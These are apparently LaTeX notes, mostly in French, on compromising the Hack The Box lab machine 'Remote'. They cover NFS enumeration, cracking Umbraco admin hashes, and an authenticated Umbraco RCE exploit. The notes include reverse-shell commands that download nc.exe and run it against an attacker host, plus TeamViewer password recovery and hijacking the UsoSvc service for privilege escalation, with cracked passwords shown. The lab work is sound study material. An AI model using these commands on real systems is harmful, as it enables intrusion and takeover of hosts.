\chapter{Remote}
\begin{itemize}
    \item {\bf technics}: seImpersonatePrivilege, printspoofer teamviewer,
        service misconfig 
    \item {\bf Components}:\gls{sqlce}
    \item {\bf tools}: srtings,john 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Discovery}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX nmap.xml 10.10.10.180
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 15:56 CEST
Nmap scan report for 10.10.10.180
Host is up (0.16s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-09-15T13:57:21
|_  start_date: N/A

\end{verbatim}

\subsubsection{smb}
neant
\subsubsection{ftp}
neant

\subsubsection{nfs}
\begin{verbatim}
$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

$ sudo nmap --script nfs* -p111,2049 10.10.10.180

PORT     STATE SERVICE
111/tcp  open  rpcbind
| nfs-ls: Volume /site_backups
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
| rwx------   4294967294  4294967294  4096   2020-02-23T18:35:48  .
| ??????????  ?           ?           ?      ?                    ..
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:39  App_Browsers
| rwx------   4294967294  4294967294  4096   2020-02-20T17:17:19  App_Data
| rwx------   4294967294  4294967294  4096   2020-02-20T17:16:40  App_Plugins
| rwx------   4294967294  4294967294  8192   2020-02-20T17:16:42  Config
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:40  aspnet_client
| rwx------   4294967294  4294967294  49152  2020-02-20T17:16:42  bin
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:42  css
| rwx------   4294967294  4294967294  152    2018-11-01T17:06:44  default.aspx
|_
| nfs-showmount:
|_  /site_backups
| nfs-statfs:
|   Filesystem     1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
|_  /site_backups  24827900.0  11724432.0  13103468.0  48%   16.0T        1023
2049/tcp open  nfs
\end{verbatim}

\subsubsection{http}

on peut recup des noms

il y a un truc a installer dans le BO (Umbraco Forms). Il renvoie sur
\url{http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms}

il y a du youtube

il y a une liste d'actions a faire (404 template, member login\ldots)
\begin{verbatim}
$ searchsploit umbraco

Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution             | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)             | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                | aspx/webapps/50241.py
Umbraco CMS - Remote Command Execution (Metasploit)                    | windows/webapps/19671.rb
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting             | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                                       | aspx/webapps/50462.txt
\end{verbatim}

pour trouver la version il faut soit être connecté soit avoir accès à la config
\begin{verbatim}
Also you can check in the web.config for the umbracoConfigurationStatus key under appSettings:

    <add key="umbracoConfigurationStatus" value="4.5.2" />
\end{verbatim}

\subsection{Umbraco}

on va aller voir ce qui se cache sur le nfs.
\subsubsection{nfs}
\begin{verbatim}
$ sudo mount -t nfs 10.10.10.180:/site_backups nfs -o nolock


$ grep 'add key' Web.config
                <add key="umbracoConfigurationStatus" value="7.12.4" />
                <add key="umbracoReservedUrls" value="~/config/splashes/booting.aspx,~/install/default.aspx,~/config/splashes/noNodes.aspx,~/VSEnterpriseHelper.axd,~/.well-known" />
                <add key="umbracoReservedPaths" value="~/umbraco,~/install/" />
                <add key="umbracoPath" value="~/umbraco" />
                <add key="umbracoHideTopLevelNodeFromPath" value="true" />
                <add key="umbracoUseDirectoryUrls" value="true" />
                <add key="umbracoTimeOutInMinutes" value="20" />
                <add key="umbracoDefaultUILanguage" value="en-US" />
                <add key="umbracoUseSSL" value="false" />
                <add key="ValidationSettings:UnobtrusiveValidationMode" value="None" />
                <add key="webpages:Enabled" value="false" />
                <add key="enableSimpleMembership" value="false" />
                <add key="autoFormsAuthentication" value="false" />
                <add key="log4net.Config" value="config\log4net.config" />
                <add key="owin:appStartup" value="UmbracoDefaultOwinStartup" />
    <add key="Umbraco.ModelsBuilder.Enable" value="true" />
    <add key="Umbraco.ModelsBuilder.ModelsMode" value="PureLive" />

<authentication mode="Forms">
                        <forms name="yourAuthCookie" loginUrl="login.aspx" protection="All" path="/" />
                </authentication>
\end{verbatim}

en recherchant la connection a la bdd sur internet on tombe sur 
\verb+\App_Data\Umbraco.sdf+ quand on \verb+strings+ dessus on chope des trucs.

\begin{verbatim}
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating TourData, UpdateDate
User "SYSTEM" 192.168.195.137User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, UpdateDate

 strings App_Data/Umbraco.sdf |grep admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success


$ strings App_Data/Umbraco.sdf |grep hashAlgorithm
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
\end{verbatim}

\begin{verbatim}
admin@htb.localb
    b8be16afba8c314ad33d812f22a04991b90e2aaa
    {"hashAlgorithm":"SHA1"}
ssmith@htb.local
    jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=
    {"hashAlgorithm":"HMACSHA256"}
\end{verbatim}

\begin{verbatim}
$ john --show hash
?:baconandcheese
\end{verbatim}

\verb+.sdf+ semble donc être de de ce que l'on peut lire la bdd de SqlCe que
l'on semble pouvoir
\href{https://www.saotn.org/convert-sqlce-database-to-sql-server/}{convertir avec ExportSqlCE40.exe}

la question est peut on la requeter. Sous windows
\href{https://github.com/christianhelle/sqlcequery}{sqlcequery}

\subsubsection{RCE}


\begin{verbatim}
python ./49488.py -u admin@htb.local -p 'baconandcheese' \
    -i 'http://10.10.10.180' -c ipconfig -a '/all'

Windows IP Configuration
Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1d2
   IPv6 Address. . . . . . . . . . . : dead:beef::79d8:32f4:a107:4c70
   Link-local IPv6 Address . . . . . : fe80::79d8:32f4:a107:4c70%12
   IPv4 Address. . . . . . . . . . . : 10.10.10.180
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2a8a%12
                                       10.10.10.2

\end{verbatim}

\begin{verbatim}
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.3 \
    LPORT=4444 -f exe > shell.exe

$ python ./49488.py -u admin@htb.local -p 'baconandcheese' -i 'http://10.10.10.180' 
    -c powershell 
    -a  "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.3/shell.exe')"

Error parsing the XSLT:System.ArgumentException: '.', hexadecimal value 0x00, is an invalid character.


$ python ./49488.py -u admin@htb.local -p 'baconandcheese' -i 'http://10.10.10.180' 
    -c powershell -a  "whoami"

iis apppool\defaultapppool
$ python ./49488.py -u admin@htb.local -p 'baconandcheese' -i 'http://10.10.10.180' 
    -c powershell 
    -a  "invoke-webrequest -uri 'http://10.10.16.3/test.txt' -outfile test.txt"
invoke-webrequest : Access to the path 'C:\windows\system32\inetsrv\test.txt' is denied.


$ python ./49488.py -u admin@htb.local -p 'baconandcheese' -i 'http://10.10.10.180' 
    -c powershell 
    -a  "invoke-webrequest -uri 'http://10.10.16.3/test.txt' -outfile /windows/temp/test.txt"

$ python ./49488.py -u admin@htb.local -p 'baconandcheese' 
    -i 'http://10.10.10.180' -c powershell 
    -a  "ls /windows/temp/test.txt"


    Directory: C:\windows\temp


Mode                LastWriteTime         Length Name                                                    
----                -------------         ------ ----                                                    
-a----        9/19/2022  10:46 PM              5 test.txt 

$ python ./49488.py -u admin@htb.local -p 'baconandcheese' -i 'http://10.10.10.180' 
    -c powershell 
    -a "invoke-webrequest -uri 'http://10.10.16.3/nc64.exe' -outfile /windows/temp/nc.exe"

$ python ./49488.py -u admin@htb.local -p 'baconandcheese' -i 'http://10.10.10.180' 
i   -c powershell 
    -a "/windows/temp/nc.exe 10.10.16.3 4444 -e powershell"



PS C:\windows\system32\inetsrv> ls -Path c:\ user.txt -Recurse -ErrorAction SilentlyContinue
ls -Path c:\ user.txt -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/19/2022   8:51 PM             34 user.txt

\end{verbatim}


\subsection{Priv Esc}

\subsubsection{TeamViewer}
\begin{verbatim}

PS C:\windows\system32\inetsrv> Get-Command "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe" | fl *
Get-Command "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe" | fl *


HelpUri            :
FileVersionInfo    : File:             C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe
                     InternalName:     TeamViewer
                     OriginalFilename: TeamViewer.exe
                     FileVersion:      7.0.43148.0
                     FileDescription:  TeamViewer Remote Control Application
                     Product:          TeamViewer
                     ProductVersion:   7.0
                     Debug:            False
                     Patched:          False
                     PreRelease:       False
                     PrivateBuild:     True
                     SpecialBuild:     False
                     Language:         English (United Kingdom)

Path               : C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe
Extension          : .exe
Definition         : C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe
Source             : C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe
Version            : 7.0.0.0
Visibility         : Public
OutputType         : {System.String}
Name               : TeamViewer.exe
CommandType        : Application
ModuleName         :
Module             :
RemotingCapability : PowerShell
Parameters         :
ParameterSets      :




PS C:\Program Files (x86)\TeamViewer\Version7> cat TeamViewer7_Logfile.log

...
Start:              2022/09/20 21:48:24.600
Version:            7.0.43148
ID:                 1769137322
License:            0
Server:             master11.teamviewer.com
IC:                 301094961
OS:                 Win_6.2.9200_S (64-bit)
IP:                 127.0.0.1
MID:                u1ca739424eb469fa07f561c501d49579005056b977e3827b61ef3f600f5ab8328e264ff7812d
MIDv:               1
Proxy-Settings:     Type=1 IP= User=
IE:                 9.11.17763.0
AppPath:            C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe
UserAccount:        SYSTEM
...

PS C:\Program Files (x86)\TeamViewer\Version7> Get-Process | ft id,name
Get-Process | ft id,name

  Id Name
  -- ----
  ...
2220 TeamViewer_Service
  ...


PS C:\Program Files (x86)\TeamViewer\Version7> Get-Service | where {$_.Status -eq 'Running'}
...
Running  TeamViewer7        TeamViewer 7

PS C:\Program Files (x86)\TeamViewer\Version7> Get-Service -Name TeamViewer7 | fl *
Get-Service -Name TeamViewer7 | fl *


Name                : TeamViewer7
RequiredServices    : {}
CanPauseAndContinue : False
CanShutdown         : True
CanStop             : True
DisplayName         : TeamViewer 7
DependentServices   : {}
MachineName         : .
ServiceName         : TeamViewer7
ServicesDependedOn  : {}
ServiceHandle       :
Status              : Running
ServiceType         : Win32OwnProcess
StartType           : Automatic
Site                :
Container           :


\Version7> get-item -Path HKLM:\System\CurrentControlSet\Services\TeamViewer7
get-item -Path HKLM:\System\CurrentControlSet\Services\TeamViewer7


    Hive: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services


Name                           Property
----                           --------
TeamViewer7                    Type           : 16
                               Start          : 2
                               ErrorControl   : 1
                               ImagePath      : "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe"
                               DisplayName    : TeamViewer 7
                               WOW64          : 332
                               ObjectName     : LocalSystem
                               Description    : TeamViewer Remote Software
                               FailureActions : {128, 81, 1, 0...}

PS C:\windows\system32\inetsrv> get-ACL -Path HKLM:\System\CurrentControlSet\Services\TeamViewer7 | fl
get-ACL -Path HKLM:\System\CurrentControlSet\Services\TeamViewer7 | fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\TeamViewer7
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Users Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         -2147483648
Audit  :
Sddl   : O:BAG:SYD:AI(A;ID;KR;;;BU)(A;CIIOID;GR;;;BU)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A
         ;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654
         721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S-1-15-3-1024-1065365936-1281604716-351173842
         8-1654721687-432734479-3232135806-4053264122-3456934681)


PS C:\windows\system32\inetsrv> Get-NetTcPConnection | where {$_.OwningProcess -eq '2220'}
Get-NetTcPConnection | where {$_.OwningProcess -eq '2220'}

LocalAddress                        LocalPort RemoteAddress                       RemotePort State       AppliedSetting
------------                        --------- -------------                       ---------- -----       --------------
127.0.0.1                           5939      0.0.0.0                             0          Listen

\end{verbatim}


\href{https://www.cvedetails.com/cve/CVE-2019-18988}{Vulnerability Details :
CVE-2019-18988}:

TeamViewer Desktop through 14.7.1965 allows a bypass of remote-login access
control because the same key is used for different customers' installations. It
used a shared AES key for all installations since at least as far back as
v7.0.43148, and used it for at least OptionsPasswordAES in the current version
of the product. If an attacker were to know this key, they could decrypt
protect information stored in the registry or configuration files of
TeamViewer. With versions before v9.x , this allowed for attackers to decrypt
the Unattended Access password to the system (which allows for remote login to
the system as well as headless file browsing). The latest version still uses
the same key for OptionPasswordAES but appears to have changed how the
Unattended Access password is stored. While in most cases an attacker requires
an existing session on a system, if the registry/configuration keys were stored
off of the machine (such as in a file share or online), an attacker could then
decrypt the required password to login to the system.

\href{https://whynotsecurity.com/blog/teamviewer/}{blog post}


\href{https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988}{TeamViewer
Specification on CVE-2019-18988}

\url{https://www.lostmypass.com/blog/how-teamviewer-stores-passwords/}

\begin{verbatim}

get-childitem -Recurse HKLM:SOFTWARE\WOW6432Node\TeamViewer
get-childitem -Recurse HKLM:SOFTWARE\WOW6432Node\TeamViewer


    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer


Name                           Property
----                           --------
Version7                       StartMenuGroup            : TeamViewer 7
                               InstallationDate          : 2020-02-20
                               InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
                               Always_Online             : 1
                               Security_ActivateDirectIn : 0
                               Version                   : 7.0.43148
                               ClientIC                  : 301094961
                               PK                        : {191, 173, 42, 237...}
                               SK                        : {248, 35, 152, 56...}
                               LastMACUsed               : {, 005056B977E3}
                               MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
                               MIDVersion                : 1
                               ClientID                  : 1769137322
                               CUse                      : 1
                               LastUpdateCheck           : 1649418879
                               UsageEnvironmentBackup    : 1
                               SecurityPasswordAES       : {255, 155, 28, 115...}
                               MultiPwdMgmtIDs           : {admin}
                               MultiPwdMgmtPWDs          :
                               {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
                               Security_PasswordStrength : 3


    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7


Name                           Property
----                           --------
AccessControl                  AC_Server_AccessControlType : 0
DefaultSettings                Autostart_GUI : 1
\end{verbatim}


\url{https://github.com/cdjIT/TeamViewer/blob/master/v13/TeamViewer_Settings_13.reg}

\verb+get-childitem -Recurse HKLM:\SOFTWARE\TeamViewer+

Bon en fait pour exploiter il y a un module metasploit

\begin{verbatim}
post/windows/gather/credentials/teamviewer_passwords
Found Unattended Password: !R3m0te!
\end{verbatim}


\subsubsection{Service path}

WinPeas montre 

\begin{verbatim}
[+] Modifiable Services(T1007)
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    UsoSvc: AllAccess, Start

PS C:\windows\system32\inetsrv> Get-WmiObject Win32_Service -Filter "Name='UsoSvc'" | fl *
Get-WmiObject Win32_Service -Filter "Name='UsoSvc'" | fl *


PSComputerName          : REMOTE
Name                    : UsoSvc
Status                  : OK
ExitCode                : 0
DesktopInteract         : False
ErrorControl            : Normal
PathName                : C:\Windows\system32\svchost.exe -k netsvcs -p
ServiceType             : Share Process
StartMode               : Auto
__GENUS                 : 2
__CLASS                 : Win32_Service
__SUPERCLASS            : Win32_BaseService
__DYNASTY               : CIM_ManagedSystemElement
__RELPATH               : Win32_Service.Name="UsoSvc"
__PROPERTY_COUNT        : 26
__DERIVATION            : {Win32_BaseService, CIM_Service, CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER                : REMOTE
__NAMESPACE             : root\cimv2
__PATH                  : \\REMOTE\root\cimv2:Win32_Service.Name="UsoSvc"
AcceptPause             : False
AcceptStop              : True
Caption                 : Update Orchestrator Service
CheckPoint              : 0
CreationClassName       : Win32_Service
DelayedAutoStart        : True
Description             : Manages Windows Updates. If stopped, your devices will not be able download and install
                          latest udpates.
DisplayName             : Update Orchestrator Service
InstallDate             :
ProcessId               : 992
ServiceSpecificExitCode : 0
Started                 : True
StartName               : LocalSystem
State                   : Running
SystemCreationClassName : Win32_ComputerSystem
SystemName              : REMOTE
TagId                   : 0
WaitHint                : 0
Scope                   : System.Management.ManagementScope
Path                    : \\REMOTE\root\cimv2:Win32_Service.Name="UsoSvc"
Options                 : System.Management.ObjectGetOptions
ClassPath               : \\REMOTE\root\cimv2:Win32_Service
Properties              : {AcceptPause, AcceptStop, Caption, CheckPoint...}
SystemProperties        : {__GENUS, __CLASS, __SUPERCLASS, __DYNASTY...}
Qualifiers              : {dynamic, Locale, provider, UUID}
Site                    :
Container               :


PS C:\Windows\Temp> Get-Item -Path HKLM:\System\CurrentControlSet\Services\UsoSvc
Get-Item -Path HKLM:\System\CurrentControlSet\Services\UsoSvc


    Hive: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services


Name                           Property
----                           --------
UsoSvc                         DelayedAutoStart   : 1
                               DependOnService    : {rpcss}
                               Description        : @%systemroot%\system32\usocore.dll,-102
                               DisplayName        : @%systemroot%\system32\usocore.dll,-101
                               ErrorControl       : 1
                               FailureActions     : {128, 81, 1, 0...}
                               ImagePath          : C:\Windows\system32\svchost.exe -k netsvcs -p
                               ObjectName         : LocalSystem
                               PreshutdownTimeout : 3600000
                               RequiredPrivileges : {SeCreateGlobalPrivilege, SeShutdownPrivilege,
                               SeCreatePageFilePrivilege, SeTcbPrivilege...}
                               ServiceSidType     : 1
                               Start              : 2
                               Type               : 32

PS C:\Windows\Temp> Get-ACL -Path HKLM:\System\CurrentControlSet\Services\UsoSvc | fl *
Get-ACL -Path HKLM:\System\CurrentControlSet\Services\UsoSvc | fl *


PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\UsoS
                          vc
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services
PSChildName             : UsoSvc
PSDrive                 : HKLM
PSProvider              : Microsoft.PowerShell.Core\Registry
CentralAccessPolicyId   :
CentralAccessPolicyName :
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\UsoS
                          vc
Owner                   : NT AUTHORITY\SYSTEM
Group                   : NT AUTHORITY\SYSTEM
Access                  : {System.Security.AccessControl.RegistryAccessRule,
                          System.Security.AccessControl.RegistryAccessRule,
                          System.Security.AccessControl.RegistryAccessRule,
                          System.Security.AccessControl.RegistryAccessRule...}
Sddl                    : O:SYG:SYD:AI(A;ID;KR;;;BU)(A;CIIOID;GR;;;BU)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;
                          CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-3-1024-106
                          5365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID
                          ;GR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-40532641
                          22-3456934681)
AccessToString          : BUILTIN\Users Allow  ReadKey
                          BUILTIN\Users Allow  -2147483648
                          BUILTIN\Administrators Allow  FullControl
                          BUILTIN\Administrators Allow  268435456
                          NT AUTHORITY\SYSTEM Allow  FullControl
                          NT AUTHORITY\SYSTEM Allow  268435456
                          CREATOR OWNER Allow  268435456
                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
                          S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-345
                          6934681 Allow  ReadKey
                          S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-345
                          6934681 Allow  -2147483648
AuditToString           :
AccessRightType         : System.Security.AccessControl.RegistryRights
AccessRuleType          : System.Security.AccessControl.RegistryAccessRule
AuditRuleType           : System.Security.AccessControl.RegistryAuditRule
AreAccessRulesProtected : False
AreAuditRulesProtected  : False
AreAccessRulesCanonical : True
AreAuditRulesCanonical  : True


PS C:\Windows\Temp> .\accesschk.exe -c UsoSvc -accepteula -l
.\accesschk.exe -c UsoSvc -accepteula -l

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright  2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

UsoSvc
  DESCRIPTOR FLAGS:
      [SE_DACL_PRESENT]
      [SE_SACL_PRESENT]
      [SE_SELF_RELATIVE]
  OWNER: NT AUTHORITY\SYSTEM
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\Authenticated Users
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_USER_DEFINED_CONTROL
  [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [2] ACCESS_ALLOWED_ACE_TYPE: S-1-5-21-3799463084-4290437372-2261193466-500
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  [4] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SERVICE
        SERVICE_ALL_ACCESS



PS C:\Windows\Temp> sc.exe config UsoSvc binpath="c:\windows\temp\nc.exe"
sc.exe config UsoSvc binpath="c:\windows\temp\nc.exe"
[SC] ChangeServiceConfig SUCCESS

\end{verbatim}


\subsubsection{PrintSpoofer}

Windows serveur 2019 + seImpersonatePrivilege


\section{Theorie}


